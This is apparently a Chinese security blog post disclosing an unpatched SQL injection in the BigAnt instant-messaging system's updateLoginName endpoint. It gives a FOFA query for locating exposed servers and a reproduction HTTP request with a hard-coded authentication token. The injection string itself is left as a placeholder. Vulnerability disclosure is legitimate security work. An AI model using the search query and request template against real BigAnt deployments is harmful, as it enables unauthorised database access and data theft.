#  【0day】大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞  
 0day收割机   2026-03-01 09:27  
  
# 漏洞简介  
  
杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Api\Controller\UserController::updateLoginName 接口存在SQL注入漏洞，攻击者可通过在 updateLoginName 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。  
# 影响版本  
  
BigAnt 5.5.x 及以上版本用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCebn7UOYXRbNDayhGyEWobicaR5bXcE7XIUcQUpgHAP4gld1BmRGkHAA86JPoa1GzOxXbJ4tHMlOPwiau2DEnXNfInBY8ZT4x7A/640?wx_fmt=png&from=appmsg "")  
  
经过测试，最新版本 6.0.1.20250407.1 也受影响  
# fofa语法  
> (body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"  
  
# 漏洞复现  
> 认证码参考大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞 的权限分析部分  
  
```
POST /api/user/updateLoginName HTTP/1.1Host: Content-Type: application/x-www-form-urlencodedauthen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&user_login=1&user_id=SQLI_POC
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWAWO99yQIqS9l5tzJboibtCJUpAy4owHsF77mO6yhml0rv5K34ZHDz1sCUapptklXDgWFLbaE0JLOsqux7MXPnTibjjHYg5BEBsg/640?wx_fmt=png&from=appmsg "")  
  
成功利用报错注入获取到数据库用户信息。  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
